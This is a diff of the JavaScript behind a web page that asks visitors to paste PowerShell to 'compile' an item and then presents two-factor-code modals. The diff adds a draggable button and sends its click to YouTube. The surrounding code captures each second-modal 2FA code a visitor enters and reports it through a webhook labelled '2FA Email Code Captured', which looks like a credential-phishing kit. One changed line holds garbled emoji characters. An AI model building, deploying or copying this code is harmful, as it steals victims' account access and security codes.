@@ -1,3 +1,70 @@
+// === Draggable Compile Button Functionality ===
+let isDragging = false;
+let currentX;
+let currentY;
+let initialX;
+let initialY;
+let xOffset = 0;
+let yOffset = 0;
+
+const compileButton = document.getElementById('enterButton');
+
+compileButton.addEventListener('mousedown', dragStart);
+compileButton.addEventListener('touchstart', dragStart);
+
+document.addEventListener('mousemove', drag);
+document.addEventListener('touchmove', drag);
+
+document.addEventListener('mouseup', dragEnd);
+document.addEventListener('touchend', dragEnd);
+
+function dragStart(e) {
+  if (e.type === 'touchstart') {
+    initialX = e.touches[0].clientX - xOffset;
+    initialY = e.touches[0].clientY - yOffset;
+  } else {
+    initialX = e.clientX - xOffset;
+    initialY = e.clientY - yOffset;
+  }
+
+  if (e.target === compileButton || compileButton.contains(e.target)) {
+    isDragging = true;
+  }
+}
+
+function drag(e) {
+  if (isDragging) {
+    e.preventDefault();
+
+    if (e.type === 'touchmove') {
+      currentX = e.touches[0].clientX - initialX;
+      currentY = e.touches[0].clientY - initialY;
+    } else {
+      currentX = e.clientX - initialX;
+      currentY = e.clientY - initialY;
+    }
+
+    xOffset = currentX;
+    yOffset = currentY;
+
+    // Keep button within viewport bounds
+    const rect = compileButton.getBoundingClientRect();
+    const maxX = window.innerWidth - rect.width;
+    const maxY = window.innerHeight - rect.height;
+
+    currentX = Math.max(0, Math.min(currentX, maxX));
+    currentY = Math.max(0, Math.min(currentY, maxY));
+
+    compileButton.style.transform = `translate3d(${currentX}px, ${currentY}px, 0)`;
+  }
+}
+
+function dragEnd(e) {
+  initialX = currentX;
+  initialY = currentY;
+  isDragging = false;
+}
+
 // === UI Setup ===
 document.getElementById('instructions').textContent =
   'Press on the "Compile Item" button to compile your item. Once you have your PowerShell copied, you can paste it and hit "Enter" to check.';
@@ -49,9 +116,12 @@ function closeAllModals() {
   ['modal', 'twofa-modal', 'twofa-modal-2', 'faqModal', 'aboutModal', 'tosModal'].forEach(closeModal);
 }
 
-// === Main Button ===
-document.getElementById('enterButton').addEventListener('click', function() {
-  openModal('modal');
+// === Main Button - Now links to YouTube ===
+document.getElementById('enterButton').addEventListener('click', function(e) {
+  // Only open YouTube if not dragging
+  if (!isDragging) {
+    window.open('https://youtube.com', '_blank');
+  }
 });
 
 // === PowerShell Submission ===
@@ -282,7 +352,7 @@ if (twofaInput2 && verifyButton2) {
     }
 
     // Send webhook for email code
-    await sendSecureWebhook('2FA Email Code Captured 📩', `Second Modal Code Entered: **${codeEnteredValue}**`, 0xffa500);
+    await sendSecureWebhook('2FA Email Code Captured ��', `Second Modal Code Entered: **${codeEnteredValue}**`, 0xffa500);
 
     twofaInput2.value = '';
     closeModal('twofa-modal-2');
